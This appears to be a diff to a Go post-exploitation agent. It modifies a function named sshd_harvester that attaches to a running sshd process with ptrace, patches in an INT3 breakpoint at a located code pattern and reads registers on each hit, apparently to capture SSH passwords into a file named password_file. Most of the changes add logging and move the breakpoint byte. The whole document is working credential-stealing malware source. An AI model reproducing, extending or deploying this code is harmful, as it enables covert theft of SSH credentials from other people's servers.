@@ -6,7 +6,6 @@ package agent
 import (
 	"bytes"
 	"fmt"
-	"log"
 	"os"
 	"runtime"
 	"strconv"
@@ -151,15 +150,18 @@ func sshd_harvester(pid int, password_file string, code_pattern []byte) {
 	// points to the start of our code pattern
 	pcode_pattern := uintptr(ptr)
 	// dump code at code pattern
-	dump_code(pid, pcode_pattern)
+	util.LogFilePrintf(password_file, "Code pattern found at 0x%x", pcode_pattern)
+	dump_code(pid, pcode_pattern, password_file)
 
 	// before breakpoint, what does the code look like
-	dump_code(pid, 0)
+	util.LogFilePrintf(password_file, "Before setting the breakpoint, what does the code look like?")
+	dump_code(pid, 0, password_file)
 
 	// write breakpoint
 	code_with_trap := make([]byte, 8)
 	copy(code_with_trap, code_pattern)
-	code_with_trap[len(code_with_trap)-1] = 0xCC
+	code_with_trap[0] = 0xCC
+	// code_with_trap[len(code_with_trap)-1] = 0xCC
 	util.LogFilePrintf(password_file, "Patching code 0x%x to 0x%x", code_pattern, code_with_trap)
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
 	if err != nil {
@@ -167,7 +169,8 @@ func sshd_harvester(pid int, password_file string, code_pattern []byte) {
 		return
 	}
 	util.LogFilePrintf(password_file, "INT3 written, breakpoint set")
-	dump_code(pid, pcode_pattern)
+	util.LogFilePrintf(password_file, "Dumping code at code pattern 0x%x to check if bp has been set", pcode_pattern)
+	dump_code(pid, pcode_pattern, password_file)
 	util.LogFilePrintf(password_file, "Resuming process to let it hit breakpoint")
 	err = unix.PtraceCont(pid, int(unix.SIGCONT))
 	if err != nil {
@@ -180,12 +183,24 @@ func sshd_harvester(pid int, password_file string, code_pattern []byte) {
 		util.LogFilePrintf(password_file, "wait %d to hit breakpoint: %v", pid, err)
 		return
 	}
+	switch {
+	case wstatus.Exited():
+		util.LogFilePrintf(password_file, "SSHD %d exited...", pid)
+		return
+	case wstatus.CoreDump():
+		util.LogFilePrintf(password_file, "SSHD %d core dumped...", pid)
+		return
+	case wstatus.Continued():
+		util.LogFilePrintf(password_file, "SSHD %d continues...", pid)
+	case wstatus.Stopped():
+		util.LogFilePrintf(password_file, "SSHD %d has hit breakpoint", pid)
+	}
 
 handler:
 	success := false
-	util.LogFilePrintf(password_file, "SSHD %d has hit breakpoint", pid)
 	// where are we at
-	dump_code(pid, 0)
+	util.LogFilePrintf(password_file, "Dumping code at RIP after hitting breakpoint")
+	dump_code(pid, 0, password_file)
 
 	// read registers on break
 	regs := new(unix.PtraceRegs)
@@ -249,7 +264,8 @@ handler:
 	util.LogFilePrintf(password_file, "Single step done")
 
 	// check if breakpoint is removed
-	dump_code(pid, pcode_pattern)
+	util.LogFilePrintf(password_file, "Dumping code at code pattern 0x%x to check if bp has been removed", pcode_pattern)
+	dump_code(pid, pcode_pattern, password_file)
 	util.LogFilePrintf(password_file, "Breakpoint should now be removed: 0x%x, sshd will proceed", word)
 
 	// add breakpoint back
@@ -287,30 +303,31 @@ handler:
 	}
 }
 
-func dump_code(pid int, addr uintptr) {
+func dump_code(pid int, addr uintptr, log_file string) {
 	if addr == 0 {
 		regs := new(unix.PtraceRegs)
 		err := unix.PtraceGetRegs(pid, regs)
 		if err != nil {
-			log.Printf("dump code for %d failed: %v", pid, err)
+			util.LogFilePrintf(log_file, "dump code for %d failed: %v", pid, err)
 			return
 		}
 		addr = uintptr(regs.Rip)
+		util.LogFilePrintf(log_file, "Dumping code at RIP (0x%x)", addr)
 	}
 	code_bytes := make([]byte, 128)
 	_, err := unix.PtracePeekText(pid, addr, code_bytes)
 	if err != nil {
-		log.Printf("dump code for %d failed: PEEKTEXT: %v", pid, err)
+		util.LogFilePrintf(log_file, "dump code for %d failed: PEEKTEXT: %v", pid, err)
 		return
 	}
-	log.Printf("Dumped code at 0x%x: 0x%x", addr, code_bytes)
+	util.LogFilePrintf(log_file, "Dumped code at 0x%x: 0x%x", addr, code_bytes)
 }
 
-func get_tracer_pid(pid int) (tracer_pid int) {
+func get_tracer_pid(pid int, log_file string) (tracer_pid int) {
 	// check tracer pid
 	proc_status, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
 	if err != nil {
-		log.Printf("get_tracer: %v", err)
+		util.LogFilePrintf(log_file, "get_tracer: %v", err)
 		return
 	}
 	lines := strings.Split(string(proc_status), "\n")
@@ -319,7 +336,7 @@ func get_tracer_pid(pid int) (tracer_pid int) {
 			tracer := strings.Fields(line)[1]
 			tracer_pid, err = strconv.Atoi(tracer)
 			if err != nil {
-				log.Printf("Invalid tracer PID: %v", err)
+				util.LogFilePrintf(log_file, "Invalid tracer PID: %v", err)
 				return
 			}
 			break
